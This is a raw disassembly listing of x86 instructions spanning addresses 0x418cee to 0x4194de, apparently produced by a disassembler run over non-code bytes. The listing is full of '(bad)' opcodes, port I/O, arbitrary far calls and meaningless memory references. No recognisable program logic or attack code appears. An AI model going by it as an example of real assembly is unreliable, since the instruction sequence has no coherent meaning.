  418cee:	stos   DWORD PTR es:[edi],eax
  418cef:	sub    eax,0x37dad68b
  418cf4:	mov    ds:0xa44a65aa,al
  418cf9:	and    esi,DWORD PTR [esi]
  418cfb:	mul    BYTE PTR [ecx+ecx*8-0x15]
  418cff:	stc    
  418d00:	bound  eax,QWORD PTR [edi]
  418d02:	packsswb mm1,QWORD PTR [edi-0x4b]
  418d06:	es inc esi
  418d08:	jae    0x418cd8
  418d0a:	mov    esp,0xf09ada10
  418d0f:	cmp    esi,DWORD PTR [ebp-0x613d6125]
  418d15:	ins    BYTE PTR es:[edi],dx
  418d16:	sbb    ah,BYTE PTR [ebx]
  418d18:	jge    0x418d3d
  418d1a:	xlat   BYTE PTR ds:[ebx]
  418d1b:	xchg   esp,eax
  418d1c:	ficomp WORD PTR [ebx+0x26]
  418d1f:	out    dx,eax
  418d20:	fucom  st(7)
  418d22:	lock cmc 
  418d24:	pop    edi
  418d25:	ins    DWORD PTR es:[edi],dx
  418d26:	lods   al,BYTE PTR ds:[esi]
  418d27:	repnz inc esp
  418d29:	jbe    0x418cb4
  418d2b:	ror    ebp,1
  418d2d:	call   0x3a4f:0x82fb8cee
  418d34:	ds (bad) 
  418d36:	mov    ds:0x8845d48e,al
  418d3b:	out    0xfa,al
  418d3d:	or     bh,BYTE PTR [edx-0xa]
  418d40:	cmp    DWORD PTR [esi+0x7dc76ced],ebx
  418d46:	jp     0x418d9f
  418d48:	rcr    BYTE PTR [ecx-0x67],0x81
  418d4c:	pop    ebp
  418d4d:	into   
  418d4e:	pushf  
  418d4f:	push   esp
  418d50:	xchg   ebp,eax
  418d51:	pop    es
  418d52:	mov    bh,0x20
  418d54:	das    
  418d55:	inc    ecx
  418d56:	(bad)  
  418d58:	scas   eax,DWORD PTR es:[edi]
  418d59:	daa    
  418d5a:	rcr    BYTE PTR [esp+ebp*1+0x74],cl
  418d5e:	mov    eax,ds:0xf25d33bc
  418d63:	in     eax,0x72
  418d65:	scas   eax,DWORD PTR es:[edi]
  418d66:	enter  0x328,0x1c
  418d6a:	je     0x418d7e
  418d6c:	jno    0x418d2a
  418d6e:	jle    0x418d4b
  418d70:	jmp    0x418d06
  418d72:	retf   
  418d73:	mov    BYTE PTR [ebx+0x58a2802a],0x8f
  418d7a:	imul   edi,ebp,0x554e773b
  418d80:	jp     0x418dac
  418d82:	pusha  
  418d83:	push   eax
  418d84:	sbb    DWORD PTR [esi-0xd3f4b32],ecx
  418d8a:	or     al,0x1b
  418d8c:	sahf   
  418d8d:	xor    BYTE PTR ds:[edi-0x38],0xa6
  418d92:	pop    ebx
  418d93:	fistp  DWORD PTR [ebx+ecx*4]
  418d96:	and    BYTE PTR [ecx+0x991b68a],0xfd
  418d9d:	jp     0x418d54
  418d9f:	mul    BYTE PTR [edi]
  418da1:	push   ss
  418da2:	inc    ebx
  418da3:	into   
  418da4:	sub    DWORD PTR [esi+0x58],0xfffffffd
  418da8:	push   ebx
  418da9:	and    eax,0x5c3844d6
  418dae:	scas   eax,DWORD PTR es:[edi]
  418daf:	xchg   edx,eax
  418db0:	inc    esi
  418db1:	mov    ss,WORD PTR [edi+0x54]
  418db4:	sbb    BYTE PTR [edi],al
  418db6:	cli    
  418db7:	push   ds
  418db8:	dec    ebx
  418db9:	mov    ds:0x7a06554a,al
  418dbe:	imul   ebx,DWORD PTR [esi],0x4f063fec
  418dc4:	pop    ds
  418dc5:	cmp    BYTE PTR [eax+0x4d],cl
  418dc8:	mov    ebp,0x720fdf6a
  418dcd:	add    edi,ebx
  418dcf:	aad    0x47
  418dd1:	rcl    BYTE PTR ds:[edi-0x7f],1
  418dd5:	daa    
  418dd6:	mov    ebp,DWORD PTR [eax+0x52a6dc61]
  418ddc:	or     ebp,edx
  418dde:	(bad)  
  418ddf:	stc    
  418de0:	xchg   BYTE PTR [eax-0x74b62b0],bl
  418de6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418de7:	pop    esi
  418de8:	jle    0x418dcb
  418dea:	pop    ds
  418deb:	xor    BYTE PTR [ebx-0x8],ah
  418dee:	cmp    dl,dl
  418df0:	repnz xor esp,DWORD PTR [esp+edi*8-0x6f]
  418df5:	mov    ecx,0x75ddf5ce
  418dfa:	or     ch,bh
  418dfc:	popf   
  418dfd:	(bad)  
  418dff:	pop    eax
  418e00:	clc    
  418e01:	cwde   
  418e02:	xor    BYTE PTR [eax],0x31
  418e05:	push   cs
  418e06:	pop    ds
  418e07:	xor    al,0x3d
  418e09:	mov    WORD PTR [esi+0x44096c5],ss
  418e0f:	mov    eax,ds:0x4c5f9c68
  418e14:	jae    0x418dcc
  418e16:	jp     0x418ded
  418e18:	dec    edi
  418e19:	sbb    eax,0x7da81da6
  418e1e:	out    0x2a,al
  418e20:	fs add eax,0xf1b0fc38
  418e26:	xchg   esi,eax
  418e27:	xchg   edi,eax
  418e28:	cmp    DWORD PTR [edx],0x39
  418e2b:	jmp    0x418e6d
  418e2d:	xchg   ebp,eax
  418e2e:	mov    ds:0x7cdc493a,al
  418e33:	sti    
  418e34:	das    
  418e35:	pop    esi
  418e36:	je     0x418e06
  418e38:	int    0x73
  418e3a:	sub    BYTE PTR [edi+0x43927118],bl
  418e40:	jge    0x418e2e
  418e42:	in     eax,dx
  418e43:	test   eax,0x7a34b796
  418e48:	call   0xbcb912ce
  418e4d:	or     al,0x2b
  418e4f:	daa    
  418e50:	imul   esp,DWORD PTR [eax+0x7d],0xfffffffc
  418e54:	inc    esi
  418e55:	adc    eax,0x9a636365
  418e5a:	leave  
  418e5b:	popf   
  418e5c:	ja     0x418de1
  418e5e:	cmp    ebx,edi
  418e60:	xchg   edi,eax
  418e61:	cs mov dh,0xca
  418e64:	pushaw 
  418e66:	inc    ecx
  418e67:	repz mov eax,0x8dd2f940
  418e6d:	in     al,dx
  418e6e:	mov    eax,ds:0xcd29ca7d
  418e73:	popa   
  418e74:	cli    
  418e75:	add    BYTE PTR [ebx-0x4c78ac60],cl
  418e7b:	sub    eax,0xc8382d21
  418e80:	sub    DWORD PTR [edx-0x2d7febed],eax
  418e86:	shl    DWORD PTR [eax],1
  418e88:	loope  0x418e40
  418e8a:	dec    ecx
  418e8b:	xor    DWORD PTR [ebx-0x5b2190ef],ebx
  418e91:	mov    cl,0x2f
  418e93:	test   al,0x8f
  418e95:	mov    esp,0x54f138b2
  418e9a:	sbb    eax,0xe38ed51a
  418e9f:	dec    ebx
  418ea0:	rol    dl,0x29
  418ea3:	pop    ds
  418ea4:	pop    esp
  418ea5:	inc    esi
  418ea6:	ja     0x418f06
  418ea8:	sub    BYTE PTR [ebp+eax*8-0x4490fd28],al
  418eaf:	ins    DWORD PTR es:[edi],dx
  418eb0:	loop   0x418e33
  418eb2:	adc    DWORD PTR [ecx+0x1c3e102a],ecx
  418eb8:	adc    al,BYTE PTR [edi]
  418eba:	push   ebp
  418ebb:	cmp    eax,0xa33a1955
  418ec0:	adc    bl,BYTE PTR [eax-0x24d45351]
  418ec6:	xor    edi,DWORD PTR [ebp-0x2f923ac]
  418ecc:	mov    al,0xab
  418ece:	cli    
  418ecf:	fnstsw WORD PTR [ebp+0x5c3d1470]
  418ed5:	inc    ebx
  418ed6:	jmp    0x418f48
  418ed8:	sub    BYTE PTR [esi],cl
  418eda:	test   al,0xf9
  418edc:	sub    al,0x5c
  418ede:	enter  0x648c,0x90
  418ee2:	push   ss
  418ee3:	dec    esp
  418ee4:	inc    edx
  418ee5:	jnp    0x418f3f
  418ee7:	stc    
  418ee8:	sbb    DWORD PTR [ebx],edi
  418eea:	xor    eax,0xc159ac5f
  418eef:	cdq    
  418ef0:	inc    sp
  418ef2:	sub    eax,0xe767a1f5
  418ef7:	shl    BYTE PTR [esi-0x5d8e7125],1
  418efd:	jb     0x418f69
  418eff:	stos   BYTE PTR es:[edi],al
  418f00:	cmp    esi,esp
  418f02:	push   esp
  418f03:	enter  0x601b,0xe2
  418f07:	fisubr DWORD PTR [edi]
  418f09:	jl     0x418ee3
  418f0b:	js     0x418f0f
  418f0d:	in     eax,0x66
  418f0f:	in     eax,dx
  418f10:	mov    ebx,0x6580bb41
  418f15:	repnz mov al,BYTE PTR [edx-0x15830122]
  418f1c:	out    dx,eax
  418f1d:	sub    eax,0x219fdd14
  418f22:	mov    edi,0xc299e676
  418f27:	and    eax,0xc5e17b3e
  418f2c:	out    0xcd,eax
  418f2e:	pop    esi
  418f2f:	xor    edi,DWORD PTR [ecx+0x51]
  418f32:	inc    edi
  418f33:	pop    esi
  418f34:	add    bh,ch
  418f36:	data16 and BYTE PTR [esi+edi*1+0x3969343b],bl
  418f3e:	xor    DWORD PTR [eax],esp
  418f40:	dec    ebp
  418f41:	pop    ecx
  418f42:	or     BYTE PTR [eax-0x57],bh
  418f45:	sub    esi,esi
  418f47:	scas   eax,DWORD PTR es:[edi]
  418f48:	imul   ebp,DWORD PTR [ecx+ebx*4],0xffffffc0
  418f4c:	xor    edx,esp
  418f4e:	ds sub al,dh
  418f51:	jns    0x418fcc
  418f53:	mov    ch,ch
  418f55:	add    esp,esi
  418f57:	arpl   WORD PTR [ebp+eiz*1-0x45],ax
  418f5b:	mul    BYTE PTR [ecx+0x1551e118]
  418f61:	xor    al,0x2f
  418f63:	inc    ebp
  418f64:	inc    edi
  418f65:	pop    esi
  418f66:	sahf   
  418f67:	xchg   ecx,eax
  418f68:	and    dl,bl
  418f6a:	cmp    edx,DWORD PTR [edi+0x3f]
  418f6d:	mov    ds:0xef60d0ed,eax
  418f72:	fild   QWORD PTR [edx+0x25]
  418f75:	in     eax,dx
  418f76:	mov    dh,0x41
  418f78:	cli    
  418f79:	je     0x418f30
  418f7b:	dec    esp
  418f7c:	push   eax
  418f7d:	call   0xbb21:0xb67f793c
  418f84:	push   ecx
  418f85:	sahf   
  418f86:	and    BYTE PTR [edx+0x119fc53c],cl
  418f8c:	adc    esp,DWORD PTR [ebp+ebp*2+0x7a]
  418f90:	enter  0x9c8f,0xfa
  418f94:	mov    WORD PTR [edi-0x6f2cd311],cs
  418f9a:	lahf   
  418f9b:	pop    ecx
  418f9c:	mov    eax,DWORD PTR [eax]
  418f9e:	sub    ebx,DWORD PTR [ecx-0x4a]
  418fa1:	xor    eax,DWORD PTR ds:0xa78af148
  418fa7:	sub    eax,0x66e3ed59
  418fac:	mul    BYTE PTR [ecx+0x4b]
  418faf:	sbb    DWORD PTR ds:0x50f6ae2c,0xfffffffd
  418fb6:	out    dx,eax
  418fb7:	or     esi,DWORD PTR [esi]
  418fb9:	fild   DWORD PTR [ebp-0x1]
  418fbc:	ss mov edx,0xab4d1f2f
  418fc2:	xchg   edx,eax
  418fc3:	js     0x418fd3
  418fc5:	or     al,0x8
  418fc7:	shl    BYTE PTR [ebx+0x41154160],cl
  418fcd:	adc    eax,0xf02be2ef
  418fd2:	cmp    ch,bl
  418fd4:	jno    0x418f95
  418fd6:	add    dl,cl
  418fd8:	adc    eax,0x27c711f5
  418fdd:	out    0x42,eax
  418fdf:	retf   
  418fe0:	rol    DWORD PTR [esp+esi*8-0x29d817d0],1
  418fe7:	mov    bh,0x4c
  418fe9:	xor    BYTE PTR [edi],dh
  418feb:	fcomi  st,st(3)
  418fed:	and    BYTE PTR ds:0x78f5a618,dl
  418ff3:	int3   
  418ff4:	jp     0x41902b
  418ff6:	(bad)
  418ffb:	or     edx,edi
  418ffd:	fild   WORD PTR [ecx]
  418fff:	mov    bh,0x1c
  419001:	and    BYTE PTR [ebx+0x14],al
  419004:	or     DWORD PTR [edi],eax
  419006:	add    al,0xb0
  419008:	adc    dl,BYTE PTR [edi+0x46]
  41900b:	mov    cs,WORD PTR [ecx+0x6a]
  41900e:	jno    0x419086
  419010:	push   cs
  419011:	sbb    al,0xa8
  419013:	dec    ecx
  419014:	cmp    ch,ah
  419016:	push   cs
  419017:	fs out dx,al
  419019:	add    BYTE PTR [eax+edx*8+0xa8cfc3e],cl
  419020:	mov    gs,WORD PTR [ebp-0x47]
  419023:	xor    BYTE PTR [eax+ecx*8-0x25a9e813],dh
  41902a:	out    0x3a,eax
  41902c:	cmc    
  41902d:	or     dh,BYTE PTR ds:0x794afb3c
  419033:	and    eax,0xc9bb65e2
  419038:	push   es
  419039:	sbb    BYTE PTR [edx+0x21],0x9a
  41903d:	lods   al,BYTE PTR ds:[esi]
  41903e:	pusha  
  41903f:	xchg   ecx,eax
  419040:	xchg   DWORD PTR [eax-0x4a],eax
  419043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419044:	jbe    0x419014
  419046:	(bad)  
  419047:	int3   
  419048:	outs   dx,DWORD PTR ds:[esi]
  419049:	jg     0x41906e
  41904b:	add    edx,DWORD PTR [ebx-0x51]
  41904e:	repz xor DWORD PTR [esi+0x53],eax
  419052:	rcl    BYTE PTR [ecx+0x5949ed87],0x37
  419059:	jmp    0x4190af
  41905b:	hlt    
  41905c:	inc    esi
  41905d:	mov    al,ds:0xd5650d6d
  419062:	sar    DWORD PTR [eax-0x5e8815a4],0xa0
  419069:	jne    0x419051
  41906b:	int3   
  41906c:	push   ebp
  41906d:	dec    ebx
  41906e:	ins    DWORD PTR es:[edi],dx
  41906f:	jmp    0xbb98f4f2
  419074:	fs pop ds
  419076:	in     al,0xa5
  419078:	test   eax,0x66874af
  41907d:	mov    eax,ds:0x95c48015
  419082:	dec    esi
  419083:	adc    dl,bh
  419085:	and    eax,0xf43f92f3
  41908a:	repnz shr DWORD PTR [ebx+0x4ea28734],1
  419091:	adc    esp,DWORD PTR [edx*2+0x4c986612]
  419098:	sub    eax,0xb592c95
  41909d:	mov    ch,0x5c
  41909f:	repnz and ah,BYTE PTR [ebp+0x361a508f]
  4190a6:	mov    ebp,DWORD PTR [ebx]
  4190a8:	mov    ecx,0xf8d2910a
  4190ad:	xchg   ebp,eax
  4190ae:	mov    eax,0x189d05ab
  4190b3:	pusha  
  4190b4:	jbe    0x419100
  4190b6:	imul   eax,DWORD PTR [ebp+0x77],0x5b5134eb
  4190bd:	sub    esi,DWORD PTR [ecx+eiz*2+0x47]
  4190c1:	xchg   edi,eax
  4190c2:	fcom   DWORD PTR [ebx+0x5da5b9a4]
  4190c8:	call   0xcf9b:0x164978af
  4190cf:	adc    ebx,eax
  4190d1:	push   0xfffffffb
  4190d3:	dec    edi
  4190d4:	outs   dx,DWORD PTR ds:[esi]
  4190d5:	add    BYTE PTR [ebx+0x36],ch
  4190d8:	inc    eax
  4190d9:	scas   eax,DWORD PTR es:[edi]
  4190da:	pop    esp
  4190db:	les    esp,FWORD PTR [ecx-0x45661abe]
  4190e1:	test   al,0x5d
  4190e3:	loop   0x419098
  4190e5:	out    dx,eax
  4190e6:	dec    esi
  4190e7:	cmp    ah,ch
  4190e9:	test   DWORD PTR [ebp+0x18e8686d],ecx
  4190ef:	(bad)  
  4190f0:	pusha  
  4190f1:	push   ebx
  4190f2:	add    esi,ebp
  4190f4:	into   
  4190f5:	pop    esp
  4190f6:	ror    DWORD PTR [edx],cl
  4190f8:	nop
  4190f9:	mov    ch,BYTE PTR [eax]
  4190fb:	push   cs
  4190fc:	adc    dh,BYTE PTR ds:0x11dcc2b2
  419102:	cdq    
  419103:	loope  0x4190cf
  419105:	mov    bh,ah
  419107:	cmc    
  419108:	cmp    al,BYTE PTR [ebp-0x689ccf08]
  41910e:	mov    esp,0x3e6616d
  419113:	jbe    0x41909e
  419115:	push   ebx
  419116:	(bad)  
  419117:	push   edi
  419118:	mov    eax,0x63443c88
  41911d:	lahf   
  41911e:	jp     0x4190c7
  419120:	bswap  ecx
  419122:	retf   
  419123:	push   0xd
  419125:	push   ebx
  419126:	mov    ecx,0xa93af9d8
  41912b:	mov    esp,0x8f528ec7
  419130:	xor    ah,cl
  419132:	push   edi
  419133:	test   ch,cl
  419135:	pmulhuw mm3,QWORD PTR [esi+0x4e6b839]
  41913c:	fcmovnbe st,st(1)
  41913e:	outs   dx,BYTE PTR ds:[esi]
  41913f:	pop    ss
  419140:	int    0x16
  419142:	and    al,BYTE PTR [edi-0x4aa56917]
  419148:	scas   al,BYTE PTR es:[edi]
  419149:	aam    0x72
  41914b:	aas    
  41914c:	pop    ebx
  41914d:	cmp    eax,ebx
  41914f:	leave  
  419150:	jbe    0x419140
  419152:	add    bl,ah
  419154:	inc    ebp
  419155:	scas   eax,DWORD PTR es:[edi]
  419156:	sbb    BYTE PTR [ebp-0x4],dh
  419159:	dec    esi
  41915a:	jl     0x419120
  41915c:	cdq    
  41915d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41915e:	sbb    al,al
  419160:	rcr    BYTE PTR [ebx+0x190f06ea],cl
  419166:	jae    0x4191da
  419168:	or     esi,DWORD PTR ds:0xe6d7e93e
  41916e:	rol    BYTE PTR [eax],1
  419170:	imul   eax,DWORD PTR [ecx+0x77],0xa42c41ed
  419177:	push   ebx
  419178:	push   0xbca4e738
  41917d:	mov    bh,0x5a
  41917f:	xor    BYTE PTR [edi+0x3b],dl
  419182:	(bad)  
  419183:	xor    al,BYTE PTR [eax]
  419185:	retf   
  419186:	neg    BYTE PTR [ebp-0x3116df7a]
  41918c:	pop    ebx
  41918d:	sub    al,0xf
  41918f:	enter  0x452b,0xf1
  419193:	lock pushf 
  419195:	dec    ebx
  419196:	cmp    ah,BYTE PTR [edi-0x41f426ac]
  41919c:	mov    DWORD PTR ds:0x4ebe76a9,esp
  4191a2:	cld    
  4191a3:	jp     0x41917f
  4191a5:	in     eax,0x4c
  4191a7:	arpl   WORD PTR [edx+0x4d2b6d75],di
  4191ad:	and    bh,cl
  4191af:	mov    fs,WORD PTR [ebx+esi*2]
  4191b2:	mov    dl,0x93
  4191b4:	and    bh,BYTE PTR [esp+eax*1]
  4191b7:	je     0x4191e0
  4191b9:	or     ah,cl
  4191bb:	ins    BYTE PTR es:[edi],dx
  4191bc:	or     BYTE PTR [ebp-0x391b477c],0x3f
  4191c3:	xchg   ebp,eax
  4191c4:	loope  0x4191bb
  4191c6:	pop    esp
  4191c7:	push   esp
  4191c8:	xor    edi,DWORD PTR [ebx+0x3843838b]
  4191ce:	sub    edi,ebp
  4191d0:	rol    BYTE PTR [ebx],0x3c
  4191d3:	dec    esi
  4191d4:	xlat   BYTE PTR ds:[ebx]
  4191d5:	fstp   QWORD PTR [ebx+0x18d7723]
  4191db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191dc:	jb     0x4191bd
  4191de:	mov    bl,0x7b
  4191e0:	and    DWORD PTR [edi+0x606d71d5],esi
  4191e6:	push   0xffffffc7
  4191e8:	idiv   BYTE PTR [ebx+0x42]
  4191eb:	or     BYTE PTR [edi-0x236f7bb7],ah
  4191f1:	jmp    0xa8e89212
  4191f6:	sti    
  4191f7:	out    dx,al
  4191f8:	popa   
  4191f9:	int    0xfa
  4191fb:	push   ss
  4191fc:	in     al,dx
  4191fd:	inc    edx
  4191fe:	pop    ebx
  4191ff:	scas   eax,DWORD PTR es:[edi]
  419200:	stc    
  419201:	xlat   BYTE PTR ds:[ebx]
  419202:	or     al,0x75
  419204:	mov    al,ds:0xe86af366
  419209:	cmp    al,0x5c
  41920b:	add    dl,cl
  41920d:	test   al,0x6b
  41920f:	pop    edi
  419210:	cmp    eax,0xf345a509
  419215:	inc    ebx
  419216:	dec    ecx
  419217:	test   BYTE PTR [eax+edi*4],ah
  41921a:	sub    ebx,ecx
  41921c:	(bad)  
  41921e:	xor    al,0xd2
  419220:	add    al,0xff
  419222:	shl    cl,1
  419224:	arpl   WORD PTR [ecx+0x3],si
  419227:	psubd  mm2,QWORD PTR [esi-0x483e7360]
  41922e:	(bad)  [ebp+ecx*1+0x16ce8afd]
  419235:	inc    esi
  419236:	push   esp
  419237:	shr    BYTE PTR [edi],0x54
  41923a:	std    
  41923b:	das    
  41923c:	hlt    
  41923d:	cmp    DWORD PTR [edx-0x26afc84],ebp
  419243:	push   cs
  419244:	mov    bh,0xf2
  419246:	aaa    
  419247:	push   ebp
  419248:	retf   0x55d6
  41924b:	shr    BYTE PTR [ebp+0x75d5bdee],0xb
  419252:	push   es
  419253:	jbe    0x4192b6
  419255:	std    
  419256:	and    al,0xd4
  419258:	dec    esi
  419259:	lahf   
  41925a:	int    0x2e
  41925c:	sbb    al,0xdd
  41925e:	sti    
  41925f:	mov    ecx,0xb4df5c52
  419264:	inc    edi
  419265:	test   DWORD PTR [ecx],ebx
  419267:	mov    eax,ds:0xd55b9c3f
  41926c:	jecxz  0x419239
  41926e:	loop   0x419276
  419270:	lea    edx,[edi-0x70]
  419273:	inc    ebx
  419274:	adc    edi,DWORD PTR [ecx-0x3c09e77d]
  41927a:	je     0x4192c0
  41927c:	mov    DWORD PTR [ebx-0x37a2e344],ebp
  419282:	mov    ds:0xc1057bac,eax
  419287:	sahf   
  419288:	retf   
  419289:	inc    eax
  41928a:	push   ecx
  41928b:	xor    al,0x85
  41928d:	or     BYTE PTR [eax-0x4973e499],0x3e
  419294:	scas   eax,DWORD PTR es:[edi]
  419295:	dec    eax
  419296:	(bad)  
  419298:	aas    
  419299:	shl    BYTE PTR [eax+edx*4],0xfc
  41929d:	add    BYTE PTR [esi+0x4134f921],bh
  4192a3:	pop    fs
  4192a5:	neg    eax
  4192a7:	retf   0x5cf4
  4192aa:	ret    
  4192ab:	dec    ecx
  4192ac:	iret   
  4192ad:	fadd   DWORD PTR [edi+0x237164c]
  4192b3:	ins    BYTE PTR es:[edi],dx
  4192b4:	(bad)  
  4192b5:	pop    ss
  4192b6:	cmp    eax,0x9ac39fe0
  4192bb:	sub    ecx,DWORD PTR [edi+0x53]
  4192be:	xchg   esi,eax
  4192bf:	mov    ch,0xd6
  4192c1:	sub    DWORD PTR [eax],ebx
  4192c3:	xchg   ebx,eax
  4192c4:	bound  ebp,QWORD PTR [esi+ebp*2]
  4192c7:	and    eax,0x629517ab
  4192cc:	out    dx,eax
  4192cd:	xchg   edx,eax
  4192ce:	(bad)  
  4192cf:	ss ret 0x9ae0
  4192d3:	push   esi
  4192d4:	and    bh,BYTE PTR [edx]
  4192d6:	sbb    edi,DWORD PTR [edx]
  4192d8:	push   ebp
  4192d9:	xor    edx,DWORD PTR [edi+0x5b37fdd6]
  4192df:	gs jge 0x4192be
  4192e2:	in     eax,0xe3
  4192e4:	(bad)  
  4192e6:	iret   
  4192e7:	mov    bh,0x27
  4192e9:	jo     0x4192c4
  4192eb:	rol    BYTE PTR [eax],0xe
  4192ee:	sbb    ah,ah
  4192f0:	ins    DWORD PTR es:[edi],dx
  4192f1:	jne    0x41932c
  4192f3:	cmp    al,0x8a
  4192f5:	outs   dx,BYTE PTR ds:[esi]
  4192f6:	mov    ds:0x624345da,al
  4192fb:	or     BYTE PTR [edi],al
  4192fd:	mov    ebx,edi
  4192ff:	push   edx
  419300:	mov    ecx,0x862e7f20
  419305:	inc    edi
  419306:	cmp    BYTE PTR [edx],dh
  419308:	shl    DWORD PTR [esi-0x5e],0x84
  41930c:	fstp   TBYTE PTR [edi]
  41930e:	cmp    DWORD PTR [esi],esp
  419310:	inc    edi
  419311:	dec    edi
  419312:	xchg   esi,eax
  419313:	out    dx,al
  419314:	or     dl,ah
  419316:	je     0x4192f1
  419318:	pop    edi
  419319:	or     al,0xa4
  41931b:	mov    ds:0x4c284de5,al
  419320:	imul   ebp,esi,0x1e83e21
  419326:	xchg   edi,eax
  419327:	and    eax,0x46b66a77
  41932c:	es popa 
  41932e:	push   edx
  41932f:	mov    eax,0x6af50944
  419334:	jnp    0x419399
  419336:	sahf   
  419337:	inc    ebx
  419338:	jle    0x419329
  41933a:	xor    al,BYTE PTR [ebx]
  41933c:	les    ecx,FWORD PTR [esi-0x27]
  41933f:	and    eax,0x45f6e34d
  419344:	xchg   ebp,eax
  419345:	jae    0x419319
  419347:	loop   0x4192cb
  419349:	and    BYTE PTR [ecx],al
  41934b:	push   ebx
  41934c:	add    DWORD PTR [ebx],eax
  41934e:	fidivr WORD PTR [edi-0x3]
  419351:	adc    ebx,DWORD PTR [esi+0x7b143413]
  419357:	dec    edx
  419358:	sub    eax,0x508e1997
  41935d:	ds sub BYTE PTR ds:[edx],al
  419361:	add    eax,0x7252f95f
  419366:	mov    bl,0x5
  419368:	mov    eax,0xe5d85f2a
  41936d:	jno    0x4193a2
  41936f:	ins    DWORD PTR es:[edi],dx
  419370:	and    al,0xcc
  419372:	cwde   
  419373:	mov    bl,0x43
  419375:	sub    DWORD PTR [esi+0x52],esp
  419378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419379:	loop   0x419316
  41937b:	mov    al,ds:0x2746a8f4
  419380:	xor    al,0x6d
  419382:	cmp    eax,0x7782dc6a
  419387:	lods   eax,DWORD PTR ds:[esi]
  419388:	repnz aam 0x2e
  41938b:	xor    ecx,0xcfa3615a
  419391:	test   al,0x3a
  419394:	aad    0x83
  419396:	lds    esi,FWORD PTR ds:0xb968b763
  41939c:	retf   
  41939d:	jmp    0x3abbecbd
  4193a2:	cwde   
  4193a3:	retf   
  4193a4:	test   al,0x9b
  4193a6:	rol    BYTE PTR [eax-0x6e],cl
  4193a9:	jecxz  0x419384
  4193ab:	add    al,0x5b
  4193ad:	add    DWORD PTR [ebx],edx
  4193af:	cmp    al,0x59
  4193b1:	cmp    DWORD PTR [ebx],eax
  4193b3:	call   0x1c697008
  4193b8:	mov    al,ds:0xd54c3b8d
  4193bd:	(bad)  
  4193be:	and    ebp,DWORD PTR [edi]
  4193c0:	in     al,dx
  4193c1:	jne    0x41941c
  4193c3:	mov    eax,ds:0x7f25e9af
  4193c8:	pop    esi
  4193c9:	fidivr DWORD PTR [edx-0x43]
  4193cc:	cmp    dl,BYTE PTR [ebp+eax*8+0x59cda2af]
  4193d3:	fs dec esi
  4193d5:	adc    BYTE PTR [esi+0x24],0xb6
  4193d9:	adc    eax,0x6eea7bbb
  4193de:	data16 xlat BYTE PTR ds:[ebx]
  4193e0:	adc    BYTE PTR [edx-0x51837031],ch
  4193e6:	push   esi
  4193e7:	stc    
  4193e8:	jnp    0x4193d2
  4193ea:	adc    DWORD PTR [eax-0x5fff39e1],ecx
  4193f0:	pop    eax
  4193f1:	sub    al,0x46
  4193f3:	cmp    cl,al
  4193f5:	mov    ah,0x47
  4193f7:	mov    ch,0x2c
  4193f9:	push   0xffffffb1
  4193fb:	fistp  WORD PTR [ebx+eiz*4+0x68]
  4193ff:	inc    esp
  419400:	in     eax,0x11
  419402:	pop    ebx
  419403:	loope  0x419424
  419405:	scas   al,BYTE PTR es:[edi]
  419406:	and    eax,0x9679aeee
  41940b:	in     eax,dx
  41940c:	ror    ebx,cl
  41940e:	rcr    bl,1
  419410:	js     0x419474
  419412:	xchg   edx,eax
  419413:	loop   0x4193e5
  419415:	jle    0x41941b
  419417:	fisttp QWORD PTR [esi]
  419419:	xor    bl,BYTE PTR ds:0x776784d6
  41941f:	test   al,0x53
  419421:	inc    edi
  419422:	xor    edx,edx
  419424:	aad    0xed
  419426:	sbb    al,0x70
  419428:	xor    eax,0xbf0e56c8
  41942d:	mov    eax,ds:0xaecdd7ad
  419432:	inc    edi
  419433:	stos   DWORD PTR es:[edi],eax
  419434:	sub    al,0xb1
  419436:	in     eax,dx
  419437:	clc    
  419438:	sub    esp,ebx
  41943a:	inc    ebx
  41943b:	mov    ds:0x4492879c,eax
  419440:	in     eax,dx
  419441:	jp     0x41946e
  419443:	mov    ds:0x5547ca26,eax
  419448:	lods   eax,DWORD PTR ds:[esi]
  419449:	ret    0x11ab
  41944c:	pop    esi
  41944d:	out    0xcc,eax
  41944f:	fidiv  WORD PTR [ebp-0x146e7ead]
  419455:	lds    ebp,FWORD PTR [edx+edx*4-0x779ec583]
  41945c:	xchg   DWORD PTR [esi],edi
  41945e:	into   
  41945f:	push   esi
  419460:	imul   edx,DWORD PTR [esi+0x39b2f3e9],0x25534e1f
  41946a:	sbb    BYTE PTR [ebp-0x30],bl
  41946d:	lea    ecx,[esi-0x18079701]
  419473:	jle    0x41942d
  419475:	int3   
  419476:	faddp  st(6),st
  419478:	lods   eax,DWORD PTR ds:[esi]
  419479:	fdiv   QWORD PTR [eax+eax*1+0xf]
  41947d:	add    BYTE PTR [edx],ah
  41947f:	jl     0x419451
  419481:	(bad)  
  419483:	mov    eax,0x5677eae1
  419488:	nop
  419489:	stc    
  41948a:	push   ss
  41948b:	ins    BYTE PTR es:[edi],dx
  41948c:	loop   0x419456
  41948e:	scas   al,BYTE PTR es:[edi]
  41948f:	xchg   ebp,eax
  419490:	pop    eax
  419491:	das    
  419492:	or     bl,bl
  419494:	out    0x96,al
  419496:	cmp    eax,DWORD PTR [ebp+0x43]
  419499:	cmp    edx,DWORD PTR [edx]
  41949b:	std    
  41949c:	xor    ebx,ebx
  41949e:	or     al,0x1e
  4194a0:	lods   eax,DWORD PTR ds:[esi]
  4194a1:	jg     0x41942c
  4194a3:	push   esi
  4194a4:	sbb    ebp,esp
  4194a6:	in     eax,dx
  4194a7:	les    edx,FWORD PTR [ebp+0x65]
  4194aa:	cmp    esi,ecx
  4194ac:	loop   0x4194cf
  4194ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194af:	xor    eax,0x6bc0c221
  4194b4:	ret    0xbeaf
  4194b7:	cmp    cl,BYTE PTR [ebx+0x4c]
  4194ba:	dec    edx
  4194bb:	push   esp
  4194bc:	and    BYTE PTR ds:0xe1cda721,ch
  4194c2:	and    eax,0x4c412cd9
  4194c7:	leave  
  4194c8:	sbb    DWORD PTR [edx+0x33],ebx
  4194cb:	jae    0x419520
  4194cd:	imul   edx,DWORD PTR [ebp-0x2bbd0686],0x3b616ada
  4194d7:	jp     0x41948e
  4194d9:	push   0xffffffbb
  4194db:	icebp  
  4194dc:	js     0x41954d
  4194de:	jmp    0xa2238269
